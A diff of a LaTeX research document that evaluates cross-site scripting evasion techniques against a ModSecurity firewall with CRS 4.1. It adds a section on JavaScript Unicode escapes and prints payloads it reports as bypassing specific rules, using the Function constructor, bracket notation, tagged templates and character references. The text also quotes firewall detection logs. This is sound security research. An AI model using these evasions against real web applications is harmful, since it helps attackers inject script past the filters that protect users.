@@ -203,13 +203,13 @@ The ModSecurity firewall using CRS4.1 does not allow specifying \verb|UTF-16| as
 <MatchedData>"utf-16"</MatchedData>
 \end{lstlisting}
 
-The firewall log further states that the firewall 
+The firewall log further states that the firewall
 
 \begin{quote}
 	Matched "Operator `Within' with parameter `|utf-8| |iso-8859-1| |iso-8859-15| |windows-1252|' against variable `TX:content\_type\_charset'
 \end{quote}
 
-Subsequently, every encoding permitted by this rule has been tested with the initial payload. There is no difference between the string in any of the allowed encodings. As it seems, the byte representation of first 127 characters is equal between all tested encodings. \cite{enc/diffa, enc/diffb, enc/diffc} Therefore, none of the allowed encodings can be used to create a bypassing payload from the initial payload. 
+Subsequently, every encoding permitted by this rule has been tested with the initial payload. There is no difference between the string in any of the allowed encodings. As it seems, the byte representation of first 127 characters is equal between all tested encodings. \cite{enc/diffa, enc/diffb, enc/diffc} Therefore, none of the allowed encodings can be used to create a bypassing payload from the initial payload.
 
 
 \subsubsection{HTML character references}
@@ -241,7 +241,7 @@ On escaping the first \verb|a| in \verb|javascript:| using the HTML hex characte
 <a href=jav^\&\#x61^;script:alert('a')>ClickMeFor$</a>
 \end{lstlisting}
 
-This payload bypasses the rules with ids \verb|941170| (NoScript XSS InjectionChecker: Attribute Injection) and \verb|941210|(IE XSS Filters - Attack Detected). 
+This payload bypasses the rules with ids \verb|941170| (NoScript XSS InjectionChecker: Attribute Injection) and \verb|941210|(IE XSS Filters - Attack Detected).
 
 As this result is promising, another iteration of applying this technique has been used in the multi iteration evaluation. The results are stated unter Section~\ref{sec:doublehtmlcharref}.
 
@@ -281,11 +281,11 @@ was used to evaluate the tested firewall against this evasion technique. The Mod
 
 after using string concatenation to craft an obscured variant of the example payload:
 
-\begin{lstlisting}[style=basicStyle, language=Python]
+\begin{lstlisting}[style=basicStyle, language=Python, caption='alert' + '(`concatenation`)' bypass, label={lst:strconcbypass}]
 'alert' + '(`concatenation`)'
 \end{lstlisting}
 
-the payload successfully evaded the firewall rule and reached the tested Web server. As mentioned under Section~\ref{sec:stringconc}, this technique is more effective when combined with forced evaluation. Evalutation results of combining this technique with using the function constructor to force the evaluation of the payload are stated under Section~\ref{sec:funconstrconbypass} and Section~\ref{sec:charcodemultiiter}. 
+the payload successfully evaded the firewall rule and reached the tested Web server. As mentioned under Section~\ref{sec:stringconc}, this technique is more effective when combined with forced evaluation. Evalutation results of combining this technique with using the function constructor to force the evaluation of the payload are stated under Section~\ref{sec:funconstrconbypass} and Section~\ref{sec:charcodemultiiter}.
 
 
 \subsubsection{Function Constructor}
@@ -319,14 +319,14 @@ When sent in a request directed to the test Web server protected by the evaluted
 
 It is apparent, that usage of the \verb|eval()| function is heavily blacklisted. Therefore, \verb|eval()| has been substituted by the function constructor in order to obscure the payload:
 
-\begin{lstlisting}[style=basicStyle, language=Python]
+\begin{lstlisting}[style=basicStyle, language=Python, caption=Function constructor bypass, label={lst:funconbypass}]
 [].constructor.constructor('alert' + '(`concatenation`)')()
 \end{lstlisting}
 
 The obscured payload successfully bypasses the ModSecurity firewall using CRS4.1.
 
 \subsubsection{Square bracket notation}
-As stated under Section~\ref{sec:sbn}, the square bracket notation can be used to substitute the dot notation in order to access object properties. When using the Function constructor as mentioned under Section~\ref{sec:functionconstructor}, access to object properties is neccessary. Using the square bracket notation in such a case is standing to reason. 
+As stated under Section~\ref{sec:sbn}, the square bracket notation can be used to substitute the dot notation in order to access object properties. When using the Function constructor as mentioned under Section~\ref{sec:functionconstructor}, access to object properties is neccessary. Using the square bracket notation in such a case is standing to reason.
 
 The bypassing payload mentioned under Section~\ref{sec:functionconstructorsingleeva}:
 
@@ -334,7 +334,7 @@ The bypassing payload mentioned under Section~\ref{sec:functionconstructorsingle
 [].constructor.constructor('alert' + '(`concatenation`)')()
 \end{lstlisting}
 
-has been obscured using the square bracket notation: 
+has been obscured using the square bracket notation:
 
 \begin{lstlisting}[style=basicStyle, language=Python, caption=square bracket notation bypass]
 []["constructor"]["constructor"]('alert' + '(`concatenation`)')()
@@ -370,12 +370,72 @@ After substituting the function call using \verb|("XSS")| with a Tagged Template
 alert`XSS`
 \end{lstlisting}
 
-successfully bypasses the firewall and reaches the web server. 
+successfully bypasses the firewall and reaches the web server.
 
 Further usage of this technique during multi iteration evaluation is stated under Section~\ref{sec:avoidingbypassA} and Section~\ref{sec:avoidingbypassB}.
 
+\subsubsection{JavaScript character escape}
+\label{sec:jsescapesingleiter}
+As stated under Section~\ref{sec:jsescape}, character escaping in JavaScript can be used in identifiers, string literals and template literals.
+
+The payload:
+
+\begin{lstlisting}[style=basicStyle, language=Python]
+alert("escape")
+\end{lstlisting}
+
+is being blocked by the evaluated firewall according to the following rule:
+
+\begin{lstlisting}[style=ruleStyle, language=XML, caption=alert('escape') blocked]
+<payload>alert('escape')</payload>
+
+<message>"Javascript method detected"</message>
+<file>"rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
+<fileDetails>[line "714"] [id "941390"]<fileDetails>
+<MatchedData>"alert("</MatchedData>
+\end{lstlisting}
+
+As identifiers can be escaped in JavaScript and functions are called using their identifier, the just mentioned payload can be substituted by:
+
+\begin{lstlisting}[style=basicStyle, language=Python]
+\u0061lert("escape")
+\end{lstlisting}
+
+This obscured payload is being blocked by the ModSecurity firewall using CRS4.1 according to the following rules:
+
+\begin{lstlisting}[style=ruleStyle, language=XML, caption=\textbackslash u0061lert('escape') blocked]
+<payload>\u0061lert('escape')</payload>
+
+<message>"Possible Unicode character bypass detected"</message>
+<file>"/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"</file>
+<fileDetails>[line "1263"] [id "920540"]<fileDetails>
+<MatchedData>"\x5cu0061"</MatchedData>
+
+<message>"Javascript method detected"</message>
+<file>"rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
+<fileDetails>[line "748"] [id "941390"]<fileDetails>
+<MatchedData>"alert("</MatchedData>
+\end{lstlisting}
+
+The CRS4.1 rule with id \verb|941390| applies the \verb|t:jsDecode| transformation to the payload before checking for potential matches. The ModSecurity manual states that the \verb|t:jsDecode| transformation
+
+\begin{quote}
+	decodes JavaScript escape sequences. If a \textbackslash uHHHH code is in the range of FF01-FF5E (the full width ASCII codes), then the higher byte is used to detect and adjust the lower byte. Otherwise, only the lower byte will be used and the higher byte zeroed (leading to possible loss of information). \cite{modsec/trans}
+\end{quote}
+
+Since ES6, escaping in identifiers is also possible using the Unicode code point escape \verb|\u{...}|, using Unicode code point to obscure the initial payload:
+
+\begin{lstlisting}[style=basicStyle, language=Python, caption=\textbackslash u\{0061\}lert('escape') bypass]
+\u{0061}lert("escape")
+\end{lstlisting}
+
+is also valid and bypasses the evaluated firewall.
+
+Further applications of this technique are stated under Section~\ref{sec:jsescapemultiiter} using escape sequences inside string literals and under Section~\ref{sec:htmlencjsesc} using single character escape.
+
 
 \subsubsection{eval() function}
+\label{sec:evalsingleiter}
 The ModSecurity firewall using CRS 4.1.0. checks for usage of the function \verb|eval()| and tries to block requests containing it. An example is listed in Listing~\ref{lst:evalalertXSSblocked}.
 {\color{red} hier evtl noch etwas mehr...}
 
